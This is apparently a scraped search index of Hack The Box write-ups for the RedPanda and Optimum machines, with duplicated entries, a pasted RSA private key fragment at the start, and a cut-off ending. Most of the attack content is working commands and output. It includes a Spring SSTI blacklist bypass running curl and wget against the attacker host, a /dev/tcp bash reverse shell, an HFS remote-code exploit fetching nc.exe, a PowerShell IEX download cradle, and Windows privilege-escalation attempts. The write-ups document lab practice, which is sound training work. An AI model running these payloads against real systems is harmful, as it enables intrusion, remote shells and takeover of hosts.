KQP2J0ZAPfFWmzzQum26b75eLA3HzasBJOGhlhwlElgY2qNlKJkc9nOrFrePAfdN PeXeYjXwWclL4MIAKjlFQPVg4v0Gs3GCKqMoEymMdUMlHoer2SPv0N4UBuldfXYM PhCpebtj7lMdDGUC60Ha0C4FpaiJLdbpfxHase/uHvp3S/x1oMyLwMOOSOoRZZ2B Ap+fnQEvGmp7QwfH+cJT8ggncyN+Gc17NwXrqvWhkIGnf7Bh+stJeE/sKsvG83Bi E5ugJKIIipGpZ6ubhmZZ/Wndl8Qcf80EbUYs4oIICWCMu2401dvPMXRp7PCQmAJB 5FVQhEadAoGBAOQ2/nTQCOb2DaiFXCsZSr7NTJCSD2d3s1L6cZc95LThXLL6sWJq mljR6pC7g17HTTfoXXM2JN9+kz5zNms/eVvO1Ot9GPYWj6TmgWnJlWpT075U3CMU MNEzJtWyrUGbbRvm/2C8pvNSbLhmtdAg3pDsFb884OT8b4arufE7bdWHAoGBAMjo y0+3awaLj7ILGgvukDfpK4sMvYmx4QYK2L1R6pkGX2dxa4fs/uFx45Qk79AGc55R IV1OjFqDoq/s4jj1sChKF2+8+JUcrJMsk0WIMHNtDprI5ibYy7XfHe7oHnOUxCTS CPrfj2jYM/VCkLTQzdOeITDDIUGG4QGUML8IbM8vAoGBAM6apuSTzetiCF1vVlDC VfPEorMjOATgzhyqFJnqc5n5iFWUNXC2t8L/T47142mznsmleKyr8NfQnHbmEPcp ALJH3mTO3QE0zZhpAfIGiFk5SLG/24d6aPOLjnXai5Wgozemeb5XLAGOtlR+z8x7 ZWLoCIwYDjXf/wt5fh3RQo8TAoGAJ9Da2gWDlFx8MdC5bLvuoOX41ynDNlKmQchM g9iEIad9qMZ1hQ6WxJ8JdwaK8DMXHrz9W7yBXD7SMwNDIf6u1o04b9CHgyWXneMr nJAM6hMm3c4KrpAwbu60w/AEeOt2o8VsOiusBB80zNpQS0VGRTYFZeCF6rKMTP/N WU6WIckCgYBE3k00nlMiBNPBn9ZC6legIgRTb/M+WuG7DVxiRltwMoDMVIoi1oXT ExVWHvmPJh6qYvA8WfvdPYhunyIstqHEPGn14fSl6xx3+eR3djjO6J7VFgypcQwB yiu6RurPM+vUkQKb1omS+VqPH+Q7FiO+qeywqxSBotnLvVAiaOywUQ== —–END RSA PRIVATE KEY—– # Hangup\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nSQL Truncation Attack: https://resources.infosecinstitute.com/sql-truncation-attack/\nLFI XXS in Dynamic PDF: https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html\nLogrotten: https://github.com/whotwagner/logrotten"
  },
  {
    "objectID": "posts/2022-08-16-htb-writeup-redpanda/2022-08-16-htb-writeup-redpanda.html",
    "href": "posts/2022-08-16-htb-writeup-redpanda/2022-08-16-htb-writeup-redpanda.html",
    "title": "RedPanda - Hack The Box",
    "section": "",
    "text": "nmap:\n➜  redpanda nmap -Pn -n -p- 10.10.11.170\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 20:25 CEST\nNmap scan report for 10.10.11.170\nHost is up (0.032s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n8080/tcp open  http-proxy\n\n\n➜  redpanda nmap -Pn -n -sCV -p22,8080 10.10.11.170 --open\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n8080/tcp open  http-proxy\n| fingerprint-strings: \n|   GetRequest: \n|     HTTP/1.1 200 \n|     Content-Type: text/html;charset=UTF-8\n|     Content-Language: en-US\n|     Date: Mon, 15 Aug 2022 18:26:55 GMT\n|     Connection: close\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en\" dir=\"ltr\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"utf-8\"&gt;\n|     &lt;meta author=\"wooden_k\"&gt;\n|     &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;\n|     &lt;link rel=\"stylesheet\" href=\"css/panda.css\" type=\"text/css\"&gt;\n|     &lt;link rel=\"stylesheet\" href=\"css/main.css\" type=\"text/css\"&gt;\n|     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;div class='pande'&gt;\n|     &lt;div class='ear left'&gt;&lt;/div&gt;\n|     &lt;div class='ear right'&gt;&lt;/div&gt;\n|     &lt;div class='whiskers left'&gt;\n|     &lt;span&gt;&lt;/span&gt;\n|     &lt;span&gt;&lt;/span&gt;\n|     &lt;span&gt;&lt;/span&gt;\n|     &lt;/div&gt;\n|     &lt;div class='whiskers right'&gt;\n|     &lt;span&gt;&lt;/span&gt;\n|     &lt;span&gt;&lt;/span&gt;\n|     &lt;span&gt;&lt;/span&gt;\n|     &lt;/div&gt;\n|     &lt;div class='face'&gt;\n|     &lt;div class='eye\n|   HTTPOptions: \n|     HTTP/1.1 200 \n|     Allow: GET,HEAD,OPTIONS\n|     Content-Length: 0\n|     Date: Mon, 15 Aug 2022 18:26:55 GMT\n|     Connection: close\n|   RTSPRequest: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Mon, 15 Aug 2022 18:26:55 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 \n|     Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 \n|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n|_http-title: Red Panda Search | Made with Spring Boot\n|_http-open-proxy: Proxy might be redirecting requests\nVisiting port 8080 we find the RedPanda search page, where we can search for different pandas.\n\nSince this is an easy box, lets just search for something random, capture it in Burp and throw whatever we got at it; SQLi, SSTI, XXE etc.\nWith SSTI we find something interesting:  \n\n\n\nBoth @(6+5) and #{3*3} is calculated however everything starting with $ is blacklisted.. Looking on the syntax we can figure out that the backend is java, which is also seen in the website title (“Made with Spring Boot”).\nWe can bypass this blacklist by replacing $ with * instead, and are now able to extract some environment information:\n## Request\nPOST /search HTTP/1.1\nHost: 10.10.11.170:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\nOrigin: http://10.10.11.170:8080\nConnection: close\nReferer: http://10.10.11.170:8080/\nUpgrade-Insecure-Requests: 1\n\nname=*{T(java.lang.System).getenv()}\n\n## Response:\n[... snip ...]\n&lt;h2 class=\"searched\"&gt;\nYou searched for: {PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US.UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}\n&lt;/h2&gt;\nGoing to Github PayloadAllTheThings we find a one-liner to execute commands, and with this we’re able get callbacks from the victim:\n## Request\nname=*{T(java.lang.Runtime).getRuntime().exec('curl http://10.10.14.6/test')}\n\n## Callback\n➜  redpanda python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.170 - - [15/Aug/2022 21:37:09] code 404, message File not found\n10.10.11.170 - - [15/Aug/2022 21:37:09] \"GET /test HTTP/1.1\" 404 -\nTrying a bunch of one-liners fails, I am not able to get a reverse shell. So instead we go to create a payload and upload it to the victim.\n➜  redpanda echo \"bash -i &gt;& /dev/tcp/10.10.14.6/443 0&gt;&1\" &gt; revshell.sh\n## Request 1 - Upload\nname=*{T(java.lang.Runtime).getRuntime().exec('wget http://10.10.14.6/revshell.sh')}\n\n## Request 2 - Execute\nname=*{T(java.lang.Runtime).getRuntime().exec('bash revshell.sh')}\n➜  redpanda nc -lvnp 443 \nlistening on [any] 443 ...\nconnect to [10.10.14.6] from (UNKNOWN) [10.10.11.170] 32894\nbash: cannot set terminal process group (879): Inappropriate ioctl for device\nbash: no job control in this shell\nwoodenk@redpanda:/tmp/hsperfdata_woodenk$ \n\nwoodenk@redpanda:~$ cat user.txt\n4f591f5aaa56e50ec3bb7ac485cc81c3"
  },
  {
    "objectID": "posts/2022-08-16-htb-writeup-redpanda/2022-08-16-htb-writeup-redpanda.html#references",
    "href": "posts/2022-08-16-htb-writeup-redpanda/2022-08-16-htb-writeup-redpanda.html#references",
    "title": "RedPanda - Hack The Box",
    "section": "References",
    "text": "References\n\nPortSwigger - XXE\nPayloadAllTheThings - SSTI"
  },
  {
    "objectID": "posts/2019-04-14-htb-writeup-optimum/2019-04-14-htb-writeup-optimum.html",
    "href": "posts/2019-04-14-htb-writeup-optimum/2019-04-14-htb-writeup-optimum.html",
    "title": "Optimum - Hack The Box",
    "section": "",
    "text": "[root:/git/htb/optimum]# nmap -Pn -n -sCV 10.10.10.8 --open                                                                       (master✱)\n  PORT   STATE SERVICE VERSION\n  80/tcp open  http    HttpFileServer httpd 2.3\n  |_http-server-header: HFS 2.3\n  |_http-title: HFS /\n  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\n\n-\n\n\n\n-\nVisiting the URL we quickly see valuable server information:\n&gt; Server information\n&gt; HttpFileServer 2.3\n&gt; Server time: 8/3/2021 7:12:34 μμ\n&gt; Server uptime: 00:09:16\n[root:/git/htb/optimum]# searchsploit hfs 2.3                                                                                     (master✱)\n----------------------------------------------------------------------------------------------------------- ---------------------------------\n  Exploit Title                                                                                             |  Path\n----------------------------------------------------------------------------------------------------------- ---------------------------------\nHFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                | multiple/remote/48569.py\nRejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                             | multiple/remote/30850.txt\nRejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                        | windows/remote/34668.txt\nRejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                        | windows/remote/39161.py\nRejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                   | windows/webapps/34852.txt\n----------------------------------------------------------------------------------------------------------- ---------------------------------\nThe python script windows/remote/39161.py looks promising, lets try it out.\n\nHost a webserver on port 80, containing nc.exe\nChange the script’s local IP and port\nExecute!\n\n[root:/git/htb/optimum]# python 39161.py 10.10.10.8 80\n\n[root:/srv/pub-share]# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.10.8 - - [02/Mar/2021 10:39:29] \"GET /nc.exe HTTP/1.1\" 200 -\n10.10.10.8 - - [02/Mar/2021 10:39:29] \"GET /nc.exe HTTP/1.1\" 200 -\n10.10.10.8 - - [02/Mar/2021 10:39:29] \"GET /nc.exe HTTP/1.1\" 200 -\n10.10.10.8 - - [02/Mar/2021 10:39:29] \"GET /nc.exe HTTP/1.1\" 200 -\n\n[root:/git/htb/optimum]# rlwrap nc -lvnp 4499                                                                                     (master✱)\n  listening on [any] 4499 ...\n  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.8] 49173\n  Microsoft Windows [Version 6.3.9600]\n  (c) 2013 Microsoft Corporation. All rights reserved.\n\n  C:\\Users\\kostas\\Desktop&gt; type user.txt.txt\n    d0c39409d7b994a9a1389ebf38ef5f73"
  },
  {
    "objectID": "posts/2019-04-14-htb-writeup-optimum/2019-04-14-htb-writeup-optimum.html#enumeration",
    "href": "posts/2019-04-14-htb-writeup-optimum/2019-04-14-htb-writeup-optimum.html#enumeration",
    "title": "Optimum - Hack The Box",
    "section": "",
    "text": "[root:/git/htb/optimum]# nmap -Pn -n -sCV 10.10.10.8 --open                                                                       (master✱)\n  PORT   STATE SERVICE VERSION\n  80/tcp open  http    HttpFileServer httpd 2.3\n  |_http-server-header: HFS 2.3\n  |_http-title: HFS /\n  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\n\n-\n\n\n\n-\nVisiting the URL we quickly see valuable server information:\n&gt; Server information\n&gt; HttpFileServer 2.3\n&gt; Server time: 8/3/2021 7:12:34 μμ\n&gt; Server uptime: 00:09:16\n[root:/git/htb/optimum]# searchsploit hfs 2.3                                                                                     (master✱)\n----------------------------------------------------------------------------------------------------------- ---------------------------------\n  Exploit Title                                                                                             |  Path\n----------------------------------------------------------------------------------------------------------- ---------------------------------\nHFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                | multiple/remote/48569.py\nRejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                             | multiple/remote/30850.txt\nRejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                        | windows/remote/34668.txt\nRejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                        | windows/remote/39161.py\nRejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                   | windows/webapps/34852.txt\n----------------------------------------------------------------------------------------------------------- ---------------------------------\nThe python script windows/remote/39161.py looks promising, lets try it out.\n\nHost a webserver on port 80, containing nc.exe\nChange the script’s local IP and port\nExecute!\n\n[root:/git/htb/optimum]# python 39161.py 10.10.10.8 80\n\n[root:/srv/pub-share]# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.10.8 - - [02/Mar/2021 10:39:29] \"GET /nc.exe HTTP/1.1\" 200 -\n10.10.10.8 - - [02/Mar/2021 10:39:29] \"GET /nc.exe HTTP/1.1\" 200 -\n10.10.10.8 - - [02/Mar/2021 10:39:29] \"GET /nc.exe HTTP/1.1\" 200 -\n10.10.10.8 - - [02/Mar/2021 10:39:29] \"GET /nc.exe HTTP/1.1\" 200 -\n\n[root:/git/htb/optimum]# rlwrap nc -lvnp 4499                                                                                     (master✱)\n  listening on [any] 4499 ...\n  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.8] 49173\n  Microsoft Windows [Version 6.3.9600]\n  (c) 2013 Microsoft Corporation. All rights reserved.\n\n  C:\\Users\\kostas\\Desktop&gt; type user.txt.txt\n    d0c39409d7b994a9a1389ebf38ef5f73"
  },
  {
    "objectID": "posts/2019-04-14-htb-writeup-optimum/2019-04-14-htb-writeup-optimum.html#enumeration-1",
    "href": "posts/2019-04-14-htb-writeup-optimum/2019-04-14-htb-writeup-optimum.html#enumeration-1",
    "title": "Optimum - Hack The Box",
    "section": "Enumeration",
    "text": "Enumeration\nRun Watson exploit suggester.\nC:\\Users\\kostas\\Desktop&gt; \\\\10.10.14.8\\pub-share\\WatsonNet4AnyCPU.exe\n    __    __      _\n   / / /\\ \\ \\__ _| |_ ___  ___  _ __\n   \\ \\/  \\/ / _` | __/ __|/ _ \\| '_ \\\n    \\  /\\  / (_| | |_\\__ \\ (_) | | | |\n     \\/  \\/ \\__,_|\\__|___/\\___/|_| |_|\n\n                             v0.1\n\n                    Sherlock sucks...\n                     @_RastaMouse\n\n[*] OS Build number: 9600\n[*] CPU Address Width: 64\n[*] Process IntPtr Size: 8\n[*] Using Windows path: C:\\WINDOWS\\System32\n\n[*] Appears vulnerable to MS15-051\n  [&gt;] author: \"0xPThree\"\ndescription: An EoP exists due to improper object handling in the win32k.sys kernel mode driver.\n  [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb\n  [&gt;] Notes: None.\n\n[*] Appears vulnerable to MS15-076\n  [&gt;] author: \"0xPThree\"\ndescription: Local DCOM DCE/RPC connections can be reflected back to a listening TCP socket allowing access to an NTLM authentication challenge for LocalSystem, which can be replayed to the local DCOM activation service to elevate privileges.\n  [&gt;] Exploit: https://www.exploit-db.com/exploits/37768/\n  [&gt;] Notes: None.\n\n[*] Appears vulnerable to MS15-078\n  [&gt;] author: \"0xPThree\"\ndescription: An EoP exists due to a pool based buffer overflow in the atmfd.dll driver when parsing a malformed font.\n  [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_078_atmfd_bof.rb\n  [&gt;] Notes: None.\n\n[*] Appears vulnerable to MS16-032\n  [&gt;] author: \"0xPThree\"\ndescription: An EoP exists due to a lack of sanitization of standard handles in Windows' Secondary Logon Service.\n  [&gt;] Exploit: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1\n  [&gt;] Notes: None.\n\n[*] Appears vulnerable to MS16-034\n  [&gt;] author: \"0xPThree\"\ndescription: An EoP exist when the Windows kernel-mode driver fails to properly handle objects in memory.\n  [&gt;] Exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034\n  [&gt;] Notes: None.\n\n[*] Finished. Found 5 vulns :)\nLets try the exploits.\n\nMS15-076:\n“local DCOM activation service to elevate privileges” sound promising as we want to escalate.\nReading about the exploit it’s only tested on x64/x86 Windows 7/8.1, this box is Win2012 - lets try it anyway.\nC:\\tmp&gt; //10.10.14.8/pub-share/ms15-076/Trebuchet.exe C:\\Users\\Administrator\\Desktop\\root.txt C:\\tmp\\test.txt\n  [!] Error reading initial file!\nHowever, reading a file we know exists work:\n  C:\\tmp&gt; //10.10.14.8/pub-share/ms15-076/Trebuchet.exe C:\\Users\\kostas\\Desktop\\user.txt.txt C:\\tmp\\test.txt\n    [+] Loaded in 32 bytes.\n    [+] Getting out our toolbox...\n    Junction created for C:\\Windows\\temp\\EQGJWGJW &lt;&lt;===&gt;&gt; C:\\users\\public\\libraries\\Sym\\\n    [+] Waiting for CreateSymlink to close...\n    Opened Link \\RPC Control\\ (2) -&gt; \\??\\C:\\tmp\\test.txt: 000000A8\n    Holding Symlink open for 10 seconds...\n    [+] Cleaning Up!\n  C:\\tmp&gt; type test.txt\n    d0c39409d7b994a9a1389ebf38ef5f73\n\n\nMS15-051:\nC:\\tmp&gt; //10.10.14.8/pub-share/Taihou64.exe whoami\n  --- no response ---\nC:\\tmp&gt; //10.10.14.8/pub-share/ms15-051x64.exe\n[#] ms15-051 fixed by zcgonvh\n[#] usage: ms15-051 command\n[#] eg: ms15-051 \"whoami /all\"\n\nC:\\tmp&gt; //10.10.14.8/pub-share/ms15-051x64.exe \"whoami\"\n  --- no response ---\n\n\nMS16-032:\nC:\\tmp&gt; //10.10.14.8/pub-share/ms16-032.exe\nGathering thread handles\nDone, got 3 handles\nSystem Token: 0000000000000158\nCouldn't open process token 5\n\nThe .exe doesn't work, so lets try the .ps1:\nC:\\tmp&gt; powershell.exe IEX(New-Object Net.Webclient).downloadString('http://10.10.14.8/ps-rev.ps1')\n\n[root:/srv/pub-share]# python3 -m http.server 80\n  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n  10.10.10.8 - - [02/Mar/2021 12:46:07] \"GET /ps-rev.ps1 HTTP/1.1\" 200 -\n\n[root:/git/htb/optimum]# rlwrap nc -lvnp 4488                                                                                     (master✱)\n  listening on [any] 4488 ...\n  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.8] 49259\n  PS C:\\Users\\kostas\\Desktop&gt; whoami\n    optimum\\kostas\nSummary: - ms15-051 - nope - ms15-076 - nope - ms15-078 - not checked - ms16-032 - nope - ms16-034 - not checked\nThe exploits found by Watson doesn’t seem to give anything, so lets go back one step and try windows-expoit-suggester instead.\n[root:/srv/pub-share]# python /opt/windows-exploit-suggester.py --update\n  [*] initiating winsploit version 3.3...\n  [+] writing to file 2021-03-02-mssb.xls\n  [*] done\n\n[root:/git/htb/optimum]# python /opt/windows-exploit-suggester.py --database 2021-03-02-mssb.xls --systeminfo systeminfo.txt      (master✱)\n[*] initiating winsploit version 3.3...\n[*] database file detected as xls or xlsx based on extension\n[*] attempting to read from the systeminfo input file\n[+] systeminfo input file read successfully (utf-8)\n[*] querying database file for potential vulnerabilities\n[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits\n[*] there are now 246 remaining vulns\n[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin\n[+] windows version identified as 'Windows 2012 R2 64-bit'\n[*]\n[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important\n[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)\n[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)\n[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255\n[*]\n[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important\n[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)\n[*]\n[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important\n[*]   https://github.com/foxglovesec/RottenPotato\n[*]   https://github.com/Kevin-Robertson/Tater\n[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege\n[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation\n[*]\n[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important\n[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC\n[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC\n[*]\n[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical\n[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC\n[*]\n[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important\n[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF\n[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC\n[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC\n[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)\n[*]\n[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important\n[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF\n[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC\n[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC\n[*]\n[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important\n[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC\n[*]\n[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important\n[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC\n[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC\n[*]\n[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important\n[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC\n[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC\n[*]\n[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical\n[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)\n[*]\n[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important\n[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC\n[*]\n[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important\n[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC\n[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC\n[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC\n[*]\n[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical\n[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC\n[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC\n[*]\n[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical\n[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow\n[*]\n[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important\n[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC\n[*]\n[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important\n[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC\n[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF\n[*]\n[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical\n[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC\n[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC\n[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC\n[*]\n[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important\n[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC\n[*]\n[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical\n[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC\n[*]\n[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical\n[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC\n[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC\n[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC\n[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF\n[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution 